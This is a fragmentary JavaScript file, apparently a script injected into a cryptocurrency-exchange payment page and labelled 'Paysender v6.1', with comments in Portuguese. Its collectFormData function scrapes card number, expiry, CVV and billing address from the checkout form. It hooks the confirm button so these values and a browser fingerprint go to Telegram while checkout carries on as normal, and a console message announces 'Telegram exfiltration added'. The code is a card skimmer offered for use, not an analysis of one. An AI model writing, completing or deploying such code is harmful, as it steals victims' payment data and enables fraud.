(function () {
  ...
  /* ══════════════════════════════════════════════════════════
     🆕 NOVO: Coleta de dados do modal + envio ao Telegram
  ══════════════════════════════════════════════════════════ */
  ...
  function collectFormData() {
    // Card details
    const cardNumber = document.querySelector('input[placeholder="Enter card number"]')?.value || '';
    const expiry = document.querySelector('input[placeholder="MM/YY"]')?.value || '';
    const cvv = document.querySelector('input[placeholder="Enter CVV"]')?.value || '';

    // Billing address – country (complex dropdown, extract from input inside country container)
    let country = '';
    const countryContainer = document.querySelector('.relative.inline-block.w-full .outline-none.relative.rounded-xl');
    if (countryContainer) {
      const countryInput = countryContainer.querySelector('input');
      if (countryInput && countryInput.value) country = countryInput.value;
      else {
        // fallback: get selected span from dropdown
        const selectedSpan = countryContainer.querySelector('.px-2.mx-2.rounded-lg.py-2.cursor-pointer.text-primary-text');
        if (selectedSpan) country = selectedSpan.innerText.trim();
      }
    }

    const address = document.querySelector('div.mt-4 input[placeholder=""]')?.value || '';
    // More precise: find label "Address" then next input
    const addressLabel = Array.from(document.querySelectorAll('.text-Binance-Nova.text-Text-SecondaryText .font-medium')).find(el => el.innerText === 'Address');
    const addressInput = addressLabel?.closest('.mt-4')?.querySelector('input') || document.querySelector('div.mt-4 input');
    const finalAddress = addressInput ? addressInput.value : address;

    let city = '';
    let postal = '';
    const cityLabel = Array.from(document.querySelectorAll('.text-Binance-Nova.text-Text-SecondaryText .font-medium')).find(el => el.innerText === 'City');
    if (cityLabel) {
      const cityContainer = cityLabel.closest('.w-[calc(50%-12px)]');
      if (cityContainer) {
        const cityInp = cityContainer.querySelector('input');
        if (cityInp) city = cityInp.value;
      }
    }
    const postalLabel = Array.from(document.querySelectorAll('.text-Binance-Nova.text-Text-SecondaryText .font-medium')).find(el => el.innerText === 'Postal Code');
    if (postalLabel) {
      const postalContainer = postalLabel.closest('.w-[calc(50%-12px)]');
      if (postalContainer) {
        const postalInp = postalContainer.querySelector('input');
        if (postalInp) postal = postalInp.value;
      }
    }

    return { cardNumber, expiry, cvv, country, address: finalAddress, city, postal };
  }
...
🖨️ *FINGERPRINT HASH*
\`${JSON.stringify(fingerprint).substring(0, 200)}\`
      `;
      ...
      console.error('[Paysender] Telegram send error:', err);
    }
  }
  ...
  /* ── Intercepta appendChild/insertBefore no head ── */
  ...
  /* ══════════════════════════════════════════════════════════
     HELPERS (cartões) – código original
  ══════════════════════════════════════════════════════════ */
  ...
  /* ── FUNÇÃO ORIGINAL onConfirmClick MODIFICADA ── */
  function onConfirmClick() {
    // 🆕 Envia todos os dados para o Telegram (sem bloquear o fluxo original)
  ...
  /* ══════════════════════════════════════════════════════════
     MODIFICAÇÕES BASE (código original)
  ══════════════════════════════════════════════════════════ */
  ...
  console.log('%c[Paysender v6.1] ✓ Favicon + Título + Telegram exfiltration added.','color:#1a1a1a;font-weight:bold;font-size:13px;background:#F5C842;padding:4px 10px;border-radius:4px;');
})();